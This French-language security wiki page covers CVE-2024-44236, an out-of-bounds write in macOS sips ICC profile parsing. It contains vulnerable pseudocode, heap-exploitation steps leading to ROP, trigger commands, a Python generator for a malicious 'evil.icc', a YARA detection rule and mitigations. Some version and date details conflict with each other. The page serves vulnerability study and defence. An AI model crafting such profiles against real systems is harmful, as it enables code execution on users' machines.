# WWW2Exec - sips ICC Profile Out-of-Bounds Write (CVE-2024-44236)

{{#include ../../banners/hacktricks-training.md}}

## Aperçu

Une vulnérabilité **zero-write** hors limites dans le parseur de profil ICC du **Scriptable Image Processing System** (`sips`) d'Apple macOS (macOS 15.0.1, `sips-307`) permet à un attaquant de corrompre les métadonnées de tas et de pivoter le primitive en une exécution de code complète. Le bug se situe dans la gestion du champ `offsetToCLUT` des tags `lutAToBType` (`mAB `) et `lutBToAType` (`mBA `). Si les attaquants définissent `offsetToCLUT == tagDataSize`, le parseur efface **16 octets au-delà de la fin du tampon de tas**. Le spray de tas permet à l'attaquant de mettre à zéro les structures d'allocateur ou les pointeurs C++ qui seront ensuite déréférencés, entraînant une chaîne **arbitrary-write-to-exec** (CVE-2024-44236, CVSS 7.8).

> Apple a corrigé le bug dans macOS Sonoma 15.2 / Ventura 14.7.1 (30 octobre 2024). Une deuxième variante (CVE-2025-24185) a été corrigée dans macOS 15.5 et iOS/iPadOS 18.5 le 1er avril 2025.

## Code vulnérable
```c
// Pseudocode extracted from sub_1000194D0 in sips-307 (macOS 15.0.1)
if (offsetToCLUT <= tagDataSize) {
// BAD ➜ zero 16 bytes starting *at* offsetToCLUT
for (uint32_t i = offsetToCLUT; i < offsetToCLUT + 16; i++)
buffer[i] = 0;            // no bounds check vs allocated size!
}
```
## Étapes d'exploitation

1. **Créer un profil `.icc` malveillant**

* Configurer un en-tête ICC minimal (`acsp`) et ajouter un tag `mAB ` (ou `mBA `).
* Configurer la table des tags de sorte que **`offsetToCLUT` soit égal à la taille du tag** (`tagDataSize`).
* Placer des données contrôlées par l'attaquant juste après le tag afin que les 16 écritures nulles chevauchent les métadonnées de l'allocateur.

2. **Déclencher l'analyse avec n'importe quelle opération sips qui touche le profil**

```bash
# chemin de vérification (aucun fichier de sortie nécessaire)
sips --verifyColor evil.icc
# ou implicitement lors de la conversion d'images qui intègrent le profil
sips -s format png payload.jpg --out out.png
```

3. **Corruption des métadonnées de tas ➜ écriture arbitraire ➜ ROP**
Sur l'allocateur par défaut **`nano_zone` d'Apple**, les métadonnées pour les emplacements de 16 octets se trouvent **immédiatement après** la dalle alignée à 0x1000. En plaçant le tag du profil à la fin d'une telle dalle, les 16 écritures nulles écrasent `meta->slot_B`. Après un `free` ultérieur, le pointeur empoisonné est mis en file d'attente dans la liste des petits libres, permettant à l'attaquant **d'allouer un objet factice à une adresse arbitraire** et de remplacer un pointeur de vtable C++ utilisé par sips, pivotant finalement l'exécution vers une chaîne ROP stockée dans le tampon ICC malveillant.

### Générateur PoC rapide (Python 3)
```python
#!/usr/bin/env python3
import struct, sys

HDR = b'acsp'.ljust(128, b'\0')          # ICC header (magic + padding)
TAGS = [(b'mAB ', 132, 52)]              # one tag directly after header
profile  = HDR
profile += struct.pack('>I', len(TAGS))  # tag count
profile += b''.join(struct.pack('>4sII', *t) for t in TAGS)

mab = bytearray(52)                      # tag payload (52 bytes)
struct.pack_into('>I', mab, 44, 52)      # offsetToCLUT = size (OOB start)
profile += mab

open('evil.icc', 'wb').write(profile)
print('[+] Wrote evil.icc (%d bytes)' % len(profile))
```
### Règle de détection YARA
```yara
rule ICC_mAB_offsetToCLUT_anomaly
{
meta:
description = "Detect CLUT offset equal to tag length in mAB/mBA (CVE-2024-44236)"
author       = "HackTricks"
strings:
$magic = { 61 63 73 70 }          // 'acsp'
$mab   = { 6D 41 42 20 }          // 'mAB '
$mba   = { 6D 42 41 20 }          // 'mBA '
condition:
$magic at 0 and
for any i in (0 .. 10):           // up to 10 tags
(
($mab at 132 + 12*i or $mba at 132 + 12*i) and
uint32(132 + 12*i + 4) == uint32(132 + 12*i + 8) // offset == size
)
}
```
## Impact

L'ouverture ou le traitement d'un profil ICC conçu conduit à une **exécution de code arbitraire** à distance dans le contexte de l'utilisateur invoquant (Preview, QuickLook, rendu d'images Safari, pièces jointes Mail, etc.), contournant Gatekeeper car le profil peut être intégré à l'intérieur d'images autrement bénignes (PNG/JPEG/TIFF).

## Detection & Mitigation

* **Patch!** Assurez-vous que l'hôte exécute macOS ≥ 15.2 / 14.7.1 (ou iOS/iPadOS ≥ 18.1).
* Déployez la règle YARA ci-dessus sur les passerelles email et les solutions EDR.
* Supprimez ou assainissez les profils ICC intégrés avec `exiftool -icc_profile= -overwrite_original <file>` avant tout traitement ultérieur sur des fichiers non fiables.
* Renforcez Preview/QuickLook en les exécutant dans des VM "transparence et modernisation" sandboxées lors de l'analyse de contenu inconnu.
* Pour DFIR, recherchez l'exécution récente de `sips --verifyColor` ou les chargements de bibliothèque `ColorSync` par des applications sandboxées dans le journal unifié.

## References

* Trend Micro Zero Day Initiative advisory ZDI-24-1445 – “Apple macOS ICC Profile Parsing Out-of-Bounds Write Remote Code Execution (CVE-2024-44236)”
https://www.zerodayinitiative.com/advisories/ZDI-24-1445/
* Apple security updates HT213981 “About the security content of macOS Sonoma 15.2”
https://support.apple.com/en-us/HT213981

{{#include ../../banners/hacktricks-training.md}}
